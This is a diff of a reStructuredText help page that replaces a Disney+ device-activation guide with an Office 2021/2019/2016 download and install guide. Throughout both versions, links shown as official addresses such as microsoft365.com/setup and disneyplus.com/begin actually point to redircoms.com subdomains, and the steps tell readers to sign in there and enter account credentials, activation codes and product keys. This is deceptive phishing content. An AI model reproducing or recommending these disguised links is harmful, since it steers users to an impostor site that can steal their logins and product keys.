@@ -1,5 +1,5 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+How to Download and Install or Reinstall Office 2021, Office 2019, or Office 2016: Step-by-Step
 ##################
 
 .. meta::
@@ -14,35 +14,42 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: microsoft365.com/setup
+   :target: https://ms.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+Whether you’ve purchased Office 2021, Office 2019, or Office 2016, the installation or reinstallation process is simple through `microsoft365.com/setup <https://ms.redircoms.com>`_ or `office.com/setup <https://ms.redircoms.com>`_. Use your valid product key and follow this guide to install Office on your PC or Mac.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Download Office 2021, 2019, or 2016
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Open a web browser and visit `microsoft365.com/setup <https://ms.redircoms.com>`_ or `office.com/setup <https://ms.redircoms.com>`_.
+2. Sign in with your Microsoft account or create a new one.
+3. Enter the **25-character product key** that came with your Office purchase.
+4. Click **Next** to redeem and link the product to your account.
+5. Choose your version (Office 2021, 2019, or 2016) and click **Download**.
 
 **********
-What to Do After Activation
+How to Install or Reinstall Office
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+1. Locate the downloaded Office installer file on your device.
+2. Double-click the setup file to begin the installation.
+3. Follow the prompts in the setup wizard.
+4. After installation, launch any Office app (Word, Excel, etc.).
+5. Sign in with the Microsoft account you used to redeem the product key.
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+**********
+Reinstallation Tips
+**********
+
+- Uninstall previous versions before reinstalling to avoid conflicts.
+- Use the same Microsoft account used during the first activation.
+- You can manage installations and devices from your Microsoft account dashboard.
+
+Begin setup now at `microsoft365.com/setup <https://ms.redircoms.com>`_ or `office.com/setup <https://ms.redircoms.com>`_ to install or reinstall Office 2021, 2019, or 2016 on your computer.
